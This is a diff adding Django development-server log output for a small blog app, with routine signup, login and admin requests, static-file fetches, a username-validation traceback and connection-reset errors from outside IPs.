@@ -7962,3 +7962,2504 @@ Not Found: /www.instagram.com:443
 [18/Jan/2021 21:13:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
 [18/Jan/2021 21:13:57] "GET /auth/signup HTTP/1.1" 200 5243
 [18/Jan/2021 21:13:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:17:13] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:17:13] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 21:17:13] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:17:13] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:17:13] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:17:15] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:17:15] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 21:18:39] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:18:40] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:19:12] "POST /auth/signup HTTP/1.1" 302 0
+[18/Jan/2021 21:19:12] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:19:25] "POST /auth/login HTTP/1.1" 302 0
+[18/Jan/2021 21:19:25] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:19:28] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 21:19:28] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:19:33] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:19:33] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:19:47] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:19:49] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:20:20] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:20:20] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:20:20] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:20:21] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:20:21] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 21:20:23] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:20:30] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:23:42] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:23:42] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:23:44] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:23:44] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:23:51] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:24:02] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:24:02] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 21:24:08] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:24:09] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:24:09] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:28:16] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:28:16] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:28:19] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:28:19] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 21:28:20] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:28:20] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:28:27] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 21:28:27] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[18/Jan/2021 21:28:27] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 21:28:28] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[18/Jan/2021 21:28:30] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[18/Jan/2021 21:28:30] "GET /admin/ HTTP/1.1" 200 4390
+[18/Jan/2021 21:28:32] "GET /admin/accounts/account/ HTTP/1.1" 200 6281
+[18/Jan/2021 21:28:32] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 21:28:38] "POST /admin/accounts/account/ HTTP/1.1" 200 4982
+[18/Jan/2021 21:28:40] "POST /admin/accounts/account/ HTTP/1.1" 302 0
+[18/Jan/2021 21:28:40] "GET /admin/accounts/account/ HTTP/1.1" 200 6036
+[18/Jan/2021 21:28:40] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 21:28:42] "GET /admin/accounts/account/1/change/ HTTP/1.1" 200 20204
+[18/Jan/2021 21:28:42] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 21:28:42] "GET /static/admin/js/calendar.js HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 304 0
+[18/Jan/2021 21:28:42] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 304 0
+[18/Jan/2021 21:29:28] "POST /admin/accounts/account/1/change/ HTTP/1.1" 302 0
+[18/Jan/2021 21:29:28] "GET /admin/accounts/account/ HTTP/1.1" 200 6075
+[18/Jan/2021 21:29:28] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 21:30:12] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:30:12] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 21:30:12] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 21:30:12] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 21:30:12] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 21:30:12] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 21:30:13] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:30:19] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:30:20] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:30:21] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:30:23] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:30:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:30:24] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:30:24] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:30:24] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:30:25] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:30:27] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:30:27] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:30:29] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:30:40] "GET / HTTP/1.1" 200 1752
+Internal Server Error: /auth/signup
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 40, in signup_view
+    user = Account.objects.create_user(username,email,password)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 146, in create_user
+    return self._create_user(username, email, password, **extra_fields)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 135, in _create_user
+    raise ValueError('The given username must be set')
+ValueError: The given username must be set
+[18/Jan/2021 21:30:42] "POST /auth/signup HTTP/1.1" 500 71889
+Not Found: /favicon.ico
+[18/Jan/2021 21:30:43] "GET /favicon.ico HTTP/1.1" 404 2244
+Internal Server Error: /auth/signup
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 40, in signup_view
+    user = Account.objects.create_user(username,email,password)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 146, in create_user
+    return self._create_user(username, email, password, **extra_fields)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 135, in _create_user
+    raise ValueError('The given username must be set')
+ValueError: The given username must be set
+[18/Jan/2021 21:30:45] "POST /auth/signup HTTP/1.1" 500 71889
+[18/Jan/2021 21:30:45] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:30:46] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 21:30:46] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:31:02] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:31:06] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:31:06] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:31:08] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:31:16] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:17] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:17] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:18] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:20] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:36] "POST /auth/signup HTTP/1.1" 302 0
+[18/Jan/2021 21:31:36] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:31:37] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 21:31:41] "POST /auth/login HTTP/1.1" 302 0
+[18/Jan/2021 21:31:41] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:43] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:44] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:45] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:45] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:46] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:47] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:47] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:31:47] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:47] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:31:47] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:31:53] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:53] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:31:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:54] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:31:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:54] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:31:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:55] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:55] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:31:55] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:31:55] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:32:00] "POST /auth/login HTTP/1.1" 302 0
+[18/Jan/2021 21:32:00] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:32:02] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:32:02] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:32:02] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:32:02] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:32:06] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:32:06] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:07] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:07] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:32:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:32:07] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:07] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:32:07] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:32:08] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:32:08] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:33:27] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:33:27] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 21:33:27] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:33:27] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:33:28] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:33:28] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 21:33:29] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:33:38] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:33:38] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 21:33:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 21:33:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 21:33:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 21:33:38] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 21:33:40] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:34:03] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:34:03] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 21:34:03] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 21:34:03] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 21:34:03] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 21:34:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:34:43] "POST /auth/signup HTTP/1.1" 302 0
+[18/Jan/2021 21:34:43] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 21:34:43] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 21:34:50] "POST /auth/login HTTP/1.1" 302 0
+[18/Jan/2021 21:34:50] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:34:53] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:34:53] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:34:54] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 21:35:05] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:35:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:35:06] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:35:06] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 21:35:35] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('112.153.155.242', 48660)
+----------------------------------------
+Exception happened during processing of request from ('112.153.155.242', 48658)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('112.153.155.242', 48654)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('112.153.155.242', 48656)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[18/Jan/2021 21:53:25] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-login.php
+[18/Jan/2021 21:54:50] "GET /wp-login.php HTTP/1.1" 404 2245
+Not Found: /wp-login.php
+[18/Jan/2021 21:54:51] "GET /wp-login.php HTTP/1.1" 404 2245
+[18/Jan/2021 22:09:34] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:09:34] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 22:09:34] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 22:09:38] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 22:09:38] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[18/Jan/2021 22:09:38] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 22:09:38] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /favicon.ico
+[18/Jan/2021 22:09:39] "GET /favicon.ico HTTP/1.1" 404 2244
+[18/Jan/2021 22:09:42] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[18/Jan/2021 22:09:42] "GET /admin/ HTTP/1.1" 200 5170
+[18/Jan/2021 22:09:44] "GET /admin/accounts/account/ HTTP/1.1" 200 6289
+[18/Jan/2021 22:09:44] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 22:10:56] "GET /admin/accounts/account/6/change/ HTTP/1.1" 200 20275
+[18/Jan/2021 22:10:56] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 22:11:17] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 22:11:19] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 22:11:19] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:11:19] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 22:11:20] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:11:20] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 22:11:31] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:11:31] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 22:11:31] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 22:11:31] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 22:11:31] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 22:11:31] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 22:11:31] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 22:11:41] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:11:41] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 22:11:41] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 22:11:41] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 22:11:41] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 22:11:41] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 22:11:44] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 22:12:18] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:12:20] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:12:21] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:12:22] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:12:24] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:12:25] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:12:25] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 22:12:27] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:12:28] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:12:28] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:13:39] "GET / HTTP/1.0" 200 1753
+[18/Jan/2021 22:16:38] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 22:16:38] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 22:16:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 22:16:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 22:16:38] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 22:16:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 22:16:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 22:19:18] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.53', 47768)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[18/Jan/2021 22:20:34] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.53', 43672)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[18/Jan/2021 22:20:35] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:21:37] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:27:39] "HEAD / HTTP/1.0" 200 1753
+[18/Jan/2021 22:33:41] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:41:50] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:41:50] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 22:41:51] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 22:41:52] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 22:41:52] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+----------------------------------------
+Exception happened during processing of request from ('23.100.232.233', 5761)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.100.232.233', 5760)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[18/Jan/2021 22:43:29] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:43:29] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:43:34] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:43:34] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:46:58] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:47:00] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
